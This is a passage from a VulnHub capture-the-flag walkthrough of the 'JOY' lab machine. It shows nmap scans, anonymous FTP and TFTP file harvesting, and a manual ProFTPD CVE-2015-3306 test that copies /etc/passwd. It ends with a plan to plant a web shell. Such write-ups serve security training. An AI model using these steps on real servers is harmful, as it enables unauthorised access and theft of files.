yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==|_-----END CERTIFICATE-----445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)465/tcp open smtp syn-ack ttl 64 Postfix smtpd| ssl-cert: Subject: commonName=JOY| Subject Alternative Name: DNS:JOY| Issuer: commonName=JOY| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-12-23T14:29:24| Not valid after: 2028-12-20T14:29:24| MD5: 9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b| SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165| -----BEGIN CERTIFICATE-----| MIICvDCCAaSgAwIBAgIJAOB9FmtuDenTMA0GCSqGSIb3DQEBCwUAMA4xDDAKBgNV| BAMMA0pPWTAeFw0xODEyMjMxNDI5MjRaFw0yODEyMjAxNDI5MjRaMA4xDDAKBgNV| BAMMA0pPWTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMKCCTsg68Xt| Voexi0RYRs0lVeJTsKFffjgkLN5obSRTZOxM1M37pvs5+mBgNlgFy6loMbjUbgn8| zlri4m/X6kTWGWrUDUr6QmqtndBRzZZAF+74LAmVIOekuFWWjgH1bhHAVq7rQhJ+| IhRnEE6N5IdVzSjbrVpLNacYMHMSXOlJ0DeRThF4YgpNQBD8GfDUqKDLxX7wg9M+| vAk4UwJ9l16zb5+mhyuOEAesCcdEXCBmxsMN1B8wGR2BlzLFXsTYHcEqcnNBN2aU| Jw0YTqi/2a7GOBIVY5v2LmnO4TTQuEZ6j/a2zAt58dvIaRdCcwlmzVaQ/QdhSLpl| v9Yvg8Fo/YsCAwEAAaMdMBswCQYDVR0TBAIwADAOBgNVHREEBzAFggNKT1kwDQYJ| KoZIhvcNAQELBQADggEBAA4HnoLSM97sTHyvzxGXfjrWhfrPM18Qzh+iVL46XMjc| YkZnAiyeU2FlY4xxlVjah+eb1pdNLYymbDdisv6HIkA7dfnf6jWBD2YxYSHhLfS7| dwLklgMLeoVNI3EjjkWGiIlfDRXwkwD8GglotAlAgFsBr4SKtnI3vEp6nrlfjj6y| VAxSZm3Q9z3Pm9WUZ8S6wV3MnoT5HTnRivt38Kbd1x24Bn1RsyrPIjHVteWZ+9vw| wX+4SmJ9suq568berTNJ3kv3kO0NSJO4O4z6QelwQB14lflbBMJATxCBDyIUtyow| x9Vlo8bbytCdNblSAjyxriZp1lZPmLOSe0D1YgpZWDQ=|_-----END CERTIFICATE-----|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8|_ssl-date: TLS randomness does not represent time587/tcp open smtp syn-ack ttl 64 Postfix smtpd|_ssl-date: TLS randomness does not represent time|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8| ssl-cert: Subject: commonName=JOY| Subject Alternative Name: DNS:JOY| Issuer: commonName=JOY| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2018-12-23T14:29:24| Not valid after: 2028-12-20T14:29:24| MD5: 9a80 5234 0ef3 1fdd 8f77 16fe 09ee 5b7b| SHA-1: 4f02 9a1c 1f41 2ec9 c0df 4523 b1f4 a480 25f9 0165| -----BEGIN CERTIFICATE-----| MIICvDCCAaSgAwIBAgIJAOB9FmtuDenTMA0GCSqGSIb3DQEBCwUAMA4xDDAKBgNV| BAMMA0pPWTAeFw0xODEyMjMxNDI5MjRaFw0yODEyMjAxNDI5MjRaMA4xDDAKBgNV| BAMMA0pPWTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMKCCTsg68Xt| Voexi0RYRs0lVeJTsKFffjgkLN5obSRTZOxM1M37pvs5+mBgNlgFy6loMbjUbgn8| zlri4m/X6kTWGWrUDUr6QmqtndBRzZZAF+74LAmVIOekuFWWjgH1bhHAVq7rQhJ+| IhRnEE6N5IdVzSjbrVpLNacYMHMSXOlJ0DeRThF4YgpNQBD8GfDUqKDLxX7wg9M+| vAk4UwJ9l16zb5+mhyuOEAesCcdEXCBmxsMN1B8wGR2BlzLFXsTYHcEqcnNBN2aU| Jw0YTqi/2a7GOBIVY5v2LmnO4TTQuEZ6j/a2zAt58dvIaRdCcwlmzVaQ/QdhSLpl| v9Yvg8Fo/YsCAwEAAaMdMBswCQYDVR0TBAIwADAOBgNVHREEBzAFggNKT1kwDQYJ| KoZIhvcNAQELBQADggEBAA4HnoLSM97sTHyvzxGXfjrWhfrPM18Qzh+iVL46XMjc| YkZnAiyeU2FlY4xxlVjah+eb1pdNLYymbDdisv6HIkA7dfnf6jWBD2YxYSHhLfS7| dwLklgMLeoVNI3EjjkWGiIlfDRXwkwD8GglotAlAgFsBr4SKtnI3vEp6nrlfjj6y| VAxSZm3Q9z3Pm9WUZ8S6wV3MnoT5HTnRivt38Kbd1x24Bn1RsyrPIjHVteWZ+9vw| wX+4SmJ9suq568berTNJ3kv3kO0NSJO4O4z6QelwQB14lflbBMJATxCBDyIUtyow| x9Vlo8bbytCdNblSAjyxriZp1lZPmLOSe0D1YgpZWDQ=|_-----END CERTIFICATE-----993/tcp open ssl/imap syn-ack ttl 64 Dovecot imapd|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2019-01-27T17:23:23| Not valid after: 2032-10-05T17:23:23| MD5: c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6| -----BEGIN CERTIFICATE-----| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH| yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==|_-----END CERTIFICATE-----|_imap-capabilities: ID OK post-login capabilities listed Pre-login ENABLE more LITERAL+ have LOGIN-REFERRALS SASL-IR IMAP4rev1 AUTH=PLAINA0001 IDLE995/tcp open ssl/pop3 syn-ack ttl 64 Dovecot pop3d| ssl-cert: Subject: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Issuer: commonName=JOY/organizationName=Good Tech Pte. Ltd/stateOrProvinceName=Singapore/countryName=SG/localityName=Singapore/emailAddress=joy@goodtech.com.sg/organizationalUnitName=JOY| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2019-01-27T17:23:23| Not valid after: 2032-10-05T17:23:23| MD5: c8f9 a1cb ac3b baa1 f158 2916 d7bd d3b0| SHA-1: 5df6 1fce d31e e8c4 9bd9 b5b7 27fa 4f28 cfb9 34c6| -----BEGIN CERTIFICATE-----| MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC| U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD| VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD| Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy| NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI| DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU| ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG| SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD| ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI| 3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r| 0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK| x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt| 5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl| JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF| AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA| t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw| +b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN| 1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH| yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj| p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==|_-----END CERTIFICATE-----|_ssl-date: TLS randomness does not represent time|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER PIPELINING RESP-CODES TOP UIDL CAPAMAC Address: 08:00:27:2E:3C:B7 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/11%OT=21%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=620OS:63487%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=8OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5BOS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 0.108 days (since Fri Feb 11 15:28:04 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=261 (Good luck!)IP ID Sequence Generation: All zerosService Info: Hosts: The, JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-time: | date: 2022-02-11T18:03:03|_ start_date: N/A| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.5.12-Debian)| Computer name: joy| NetBIOS computer name: JOY\\x00| Domain name: \\x00| FQDN: joy|_ System time: 2022-02-12T02:03:03+08:00| nbstat: NetBIOS name: JOY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:| JOY&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| JOY&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| JOY&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 34704/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 43248/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 58943/udp): CLEAN (Timeout)| Check 4 (port 30979/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_clock-skew: mean: 5h19m58s, deviation: 4h37m07s, median: 7h59m57s| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not requiredTRACEROUTEHOP RTT ADDRESS1 0.40 ms 192.168.110.26Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Feb 11 18:03:51 2022 -- 1 IP address (1 host up) scanned in 64.45 secondsTCP/21 (FTP)NMAP┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY]└─# nmap $ip -p 21 -sV -sCPORT STATE SERVICE VERSION21/tcp open ftp ProFTPD| ftp-anon: Anonymous FTP login allowed (FTP code 230)| drwxrwxr-x 2 ftp ftp 4096 Jan 6 2019 download|_drwxrwxr-x 2 ftp ftp 4096 Jan 10 2019 uploadMAC Address: 08:00:27:2E:3C:B7 (Oracle VirtualBox virtual NIC)Service Info: Host: The ProFTPDTCP/80 (HTTP)FFUF No directories enumeratedTCP/139,445 (SMB)SMBMap┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26]└─# smbmap -H $ip -u &#39;&#39; -p &#39;&#39;[+] Guest session IP: 192.168.110.26:445 Name: 192.168.110.26 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (Samba 4.5.12-Debian) No accessible fileshareUDP/161 (SNMP)NMAP┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp]└─# nmap -vv --reason -Pn -T4 -sU -sV -p 161 &quot;--script=banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)&quot; $ip PORT STATE SERVICE REASON VERSION161/udp open snmp udp-response ttl 64 SNMPv1 server; net-snmp SNMPv3 server (public)|_snmp-win32-software: ERROR: Script execution failed (use -d to debug)| snmp-interfaces: | lo| IP address: 127.0.0.1 Netmask: 255.0.0.0| Type: softwareLoopback Speed: 10 Mbps| Status: up| Traffic stats: 1.14 Mb sent, 1.14 Mb received| Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)| IP address: 192.168.110.26 Netmask: 255.255.255.0| MAC address: 08:00:27:2e:3c:b7 (Oracle VirtualBox virtual NIC)| Type: ethernetCsmacd Speed: 1 Gbps| Status: up|_ Traffic stats: 3.59 Gb sent, 669.09 Mb received| snmp-processes: SNIP| Name: dbus-daemon| Path: /usr/bin/dbus-daemon| Params: --system --address=systemd: --nofork --nopidfile --systemd-activation| 366: | Name: ModemManager| Path: /usr/sbin/ModemManager| 367: | Name: systemd-logind| Path: /lib/systemd/systemd-logind| 369: | Name: NetworkManager| Path: /usr/sbin/NetworkManager| Params: --no-daemon| 370: | Name: avahi-daemon| Path: avahi-daemon: running [JOY.local]| 372: | Name: rtkit-daemon| Path: /usr/lib/rtkit/rtkit-daemon| 373: | Name: accounts-daemon| Path: /usr/lib/accountsservice/accounts-daemon| 374: | Name: rsyslogd| Path: /usr/sbin/rsyslogd| Params: -n| 386: | Name: avahi-daemon| Path: avahi-daemon: chroot helper| 405: | Name: polkitd| Path: /usr/lib/policykit-1/polkitd| Params: --no-debug| 423: | Name: snmpd| Path: /usr/sbin/snmpd| Params: -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f| 445: | Name: dovecot| Path: /usr/sbin/dovecot| 447: | Name: anvil| Path: dovecot/anvil| 448: | Name: log| Path: dovecot/log| 539: | Name: mysqld| Path: /usr/sbin/mysqld| 566: | Name: dhclient| Path: /sbin/dhclient| Params: -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-enp0s17.pid -lf /var/lib/NetworkManager/dhclient-784d0bd9| 567: | Name: apache2| Path: /usr/sbin/apache2| Params: -k start| 686: | Name: minissdpd| Path: /usr/sbin/minissdpd| Params: -i 0.0.0.0| 695: | Name: in.tftpd| Path: /usr/sbin/in.tftpd| Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrickSNIP TCP/36969 --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick nmap scan did not detect TCP/36969 Initial FootholdTCP/21 (FTP) Access FTP w/ anonymous account, check for write access ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot] └─# touch test ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot] └─# ftp $ip Connected to 192.168.110.26. 220 The Good Tech Inc. FTP Server Name (192.168.110.26:root): anonymous 331 Anonymous login ok, send your complete email address as your password Password: p230 Anonymous access granted, restrictions apply Remote system type is UNIX. Using binary mode to transfer files. ftp&amp;gt; put test local: test remote: test 200 PORT command successful 150 Opening BINARY mode data connection for test 226 Transfer complete ftp&amp;gt; We have write access Download all files ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp] └─# wget -m --no-passive ftp://anonymous:anonymous@$ip #Download all View directory structure of downloaded files ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp] └─# tree -a 192.168.110.26/ 192.168.110.26/ ├── download │   └── .listing ├── .listing └── upload ├── directory ├── .listing ├── project_armadillo ├── project_bravado ├── project_desperado ├── project_emilio ├── project_flamingo ├── project_indigo ├── project_komodo ├── project_luyano ├── project_malindo ├── project_okacho ├── project_polento ├── project_ronaldinho ├── project_sicko ├── project_toto ├── project_uno ├── project_vivino ├── project_woranto ├── project_yolo ├── project_zoo └── reminder View downloaded files directory This is patrick’s home directory, while enumerating snmp earlier, we found out TCP/36969 (TFTP) is also hosting files in patrick’s home directory Therefore, we can access tftp &amp;amp; download all the files in patrick’s home directory Compiled the remaining files Could be used as a password list Check for if ProFTPD is vulnerable to CVE-2015-3306 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot] └─# nc $ip 21 220 The Good Tech Inc. FTP Server site cpfr /etc/passwd 350 File or directory exists, ready for destination name site cpto /tmp/passwd 250 Copy successful It is vulnerable Most likely, we have to exploit this vulnerability to obtain RCE, possible ways to gain initial access We can upload a web shell via FTP (we have write access) &amp;amp; use the exploit to copy it into the web directory? We can copy some sensitive file to read? Boxes that also exploits ProFTPD 1.3.5 TryHackMe: Kenobi Vulnhub: Symfonos2 TCP/36969 (TFTP) Extract filenames from directory ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp/192.168.110.26/upload] └─# cat directory | awk &#39;{print $9}&#39; &amp;gt; files.txt Create script to download all files #!/bin/bash server=&quot;tftp://$2&quot; while IFS= read -r path; do [[ &quot;$path&quot; =~ ^\\ *$ ]] &amp;amp;&amp;amp; continue dir=&quot;$(dirname &quot;$path&quot;)&quot; printf &quot;GET %s =&amp;gt; %s\\n&quot; &quot;$path&quot; &quot;$dir&quot; ! [ -d &quot;$dir&quot; ] &amp;amp;&amp;amp; mkdir -p &quot;$dir&quot; curl -o &quot;$path&quot; &quot;$server/$path&quot; done &amp;lt; &quot;$1&quot; Download all files via TFTP ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/ftp/192.168.110.26/upload] └─# ./download.sh files.txt &quot;192.168.110.26:36969&quot; View directory structure of downloaded files ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot] └─# tree -a tftp/ tftp/ ├── 1d1uQKIs2uhCqFuuSxLbX3pyHlEO0QbnVBnCcnadsZlKj8kobR1t37EWGBy8YNrv.txt ├── 1m1TUvgw6cYXjKdz1nCheX2SYP09UoKqlWZTW3of4xuqFHXdMSlkHiYKmF5OCWav.txt ├── 1the130tAehAswxzeSOHFab0TFNk6cub84kLDX33WIsjCRVf6TnuNMrnvxrU8NBu.txt ├── 33X5s0oGoB5Y66cZrQCISaIghaDCOxJl8KVbwgZJ5pshYuqUFL1dfJvpXmHrcwms.txt ├── 8DGfozhRLqasp1aK9MWkZGRfzLyXH8xIXurF8IiIgWAHMoLhR1hMHB0OhEIBtmXu.txt ├── 8PlfboqM5ukLJWZJV14D8uqwASY3J8AmItXf9S2dxw9vSbUDC8B5cYlzkuxFthJe.txt ├── 9hgGMK4tcsQzmxOWUZfcumpx4viPscuEXIT1bXoEvDBlp8mBMy5WDtNPQvBaL2jr.txt ├── a3JQla0gkeV0dT6jq5oooAXGeJ2HltsHSnCZyVppYjA9zJ53AbfaZQHvSIyA0cx7.txt ├── .bash_logout ├── .bashrc ├── BOT5HBZI7mxrXll6ct2oo73W5XEMiykMoFhSVKOzajakX6LQ8ki6nIn06AiLwecc.txt ├── CeAdo7UVy7S1I5EQHW1MqsIAiLoD1e1wn8LPdb3W9rMOlaBZQ6gp56pqb1ggYFpK.txt ├── cmKiT6e4TIsNTOmmYQpMG5vclQRcDuCLcyygLFnS7vnGokEL79JWyZIBlx4e6rtV.txt ├── directory ├── download.sh ├── DRYD3YRHRsXKeIxah70yAGjNKIxcrjBfXGjaAqqofJx13txLb5aRg8mbLEoxuBjB.txt ├── EnJ8qzNAOrXg8Ns7Ipvy9slK6rKLVuUvkjoc3q3gtwIuRXvxlhyatyrBUORTmg4K.txt ├── files.txt ├── GJsjHHmznLcMnMiWTOeQfUkEbrTF0syQcYPGkk9OU0Cu8CeeebpI2IOGcK0W0bCK.txt ├── h6IDz1W1OOJIUohSfQXuh3whjocnd9UlYxLe7c2D1eM5HGowj6oE6VYJ3oDOT5oa.txt ├── HfiUzWL2mRolOJ3VxHnbudDtUksNiU3ECDRDT0UndRJy4yDGEqPwmybxwmASZvyL.txt ├── iC0RhXCjsEwWv9vjfyNUzr3Xt75PYaWOSl0g6vwS0K0UQmbADphHcWrRFyfhEUGx.txt ├── In42GyS9nxvvy2xQ1jt5ssdKdde1CCV9xGgOAn5UxO9TMpPqiZxVk3YdPRVHByiK.txt ├── isTQxmWmT8qCto8v6jjYI3BAIYhzetrdFfu6BKIdA1oQpogJjcWPv9Co9GTx1X6d.txt ├── jA1LkzUhjM9rtDYJNfBiO5gOLi0UN1X1XCfTXO2eurrWvVcO68k4XCSPbAHfBg7N.txt ├── JKhD9y51PfXuenf4rXgoyLrHwzO2FYkjyxRXRVwsZKG6AfFpydEFR3WaNOsiEZGX.txt ├── jpGEu1MnUyXFhyMeVMKtWEXTMIeH7unA9V3NtfFfEDOKKEOhQxDQq8RAB2zAnnjV.txt ├── ka3vPjQYpGznu6fnqkscT7OG3HQZBiurbP0NsLXsoZkj843ClN9oMeSys5sMl24U.txt ├── kfYN2BelubtUE37bGHowYyOqVLxFZFw0eFp4FCQ97hWcFFikExPzDP8K464WbGxL.txt ├── lGzJbS5e0qmDsQ1P1fMwuvGgW8C3INgi0pDmzeKzluuhdbKZ9pzlE11OkwMTNEag.txt ├── LlaRVfVhbzRnqBLYpilAc65SLhcTayqn2YdNMdsNK99H7o1FdaGMF0UFOjvwltmW.txt ├── NkxhR26r5dbt10QUFbuQDd3id7hGoM3KOwTKJC3Xx2d0Yjpti2k0Om5l4jpVyMqr.txt ├── pLGvIRMFc5HPrAgFkarJyWF9U77vLbViAu0lEi7tlYQAJHBGs1nrYmUvVfzMBZlt.txt ├── pMLeyn5GkLz4fO93Pp4ySYLgYB6WNrnGIoyUPP3QKdG9rFpKZkH7vm3KBenMuYSb.txt ├── .profile ├── qmv3ubkHxChZFaN0FIEvmqd3OgrfjORg19CnE0hgkcwKG5pGneCfoy0eAeaWMxHk.txt ├── RDCUijKIMJlPncgBtdJch6Y8GB67aGk2rgFFl6K0MgSPtk0aCqOJ1Qz9Oa1JLTql.txt ├── rxX5yTMKDxHnubaLAfCfBrd1XRhCutwqCunXqWRzqO7rqwD39c87gdGFPS6BEYy8.txt ├── ShkajHsaB48w7toVamdTdIYpHSJbctz5NbWocJmPn0XATFHYq4uIEp3ORhvbl6Dn.txt ├── sWTJ2r03rMJztAbUgpqkADMUXnc9iUlt6xHQFe09JOUtkHu7447DbOptjoxEjU0A.txt ├── uk4w8KqUzr0SKmF9jROMclukfuSmtx5kTyDY9u6yZPZ3IVNV2kUlSUD7pwcIn4dF.txt ├── V96NoMKHvgTU1fQTqZveRXu8DhM8RazBdI9sXzZDAzaWYFjoXrxvXJwq8xqZVBlN.txt ├── version_control ├── wEcU5AV4vjHnFSWjcw0Rw0fgxlQFjELCnNQ1qZWCQnQbbMrJMjCnrrEItZJcOSN4.txt ├── Wkc6VTjrWCRuy1tv0zIQ1FSNmpC0KO1GS6McX8QlsrKzLbDr4ma5RFfOBjQZ2DIG.txt ├── xAbSUxQBquplbdqAXSBsPdCEB9q0q7Z2ZzhsUKaQH4PqvIk3xEBsV4YnBhvjZX3a.txt ├── Y3jUEXz8Ga8oc9qrEOY3tFqF4YvTTjKuZ1q49eTjjxxKIgfepKBdOTYQujc5j3hc.txt ├── Y6aDd0TrnLPSByKsTQGnfWAjasv55SEWQmNIrXf3OpXZSyeoouvF3xTxOUxQwkEt.txt ├── ypsWXH5trdtKSxZswckKp58XIVnZ70d74smd0U8dbEsHLzPzg3iSJGNruTpRQfEG.txt ├── z2YCbnwBAysUcWJLWk812GdOIt3jpt6WRGucfxzImJlmFZ8FdCsfzndyjqN6qItf.txt ├── zpraNtovt6tQbYIUebAQLXhKsV4izRLZOj3NIqhR50A5ZHNhcEXdtxtWPZDJJbhJ.txt └── ZsUbbJTgvZ1WMcgS2JrA11QjneeUOaDNAXkklrCLTHXv9UdAymqWVcCHyUlwAh2a.txt View downloaded files Compiled ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/tftp] └─# mkdir script ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-JOY/192.168.110.26/loot/tftp] └─# mv files.txt download.sh directory script/ # We already know content of these files, move them away. 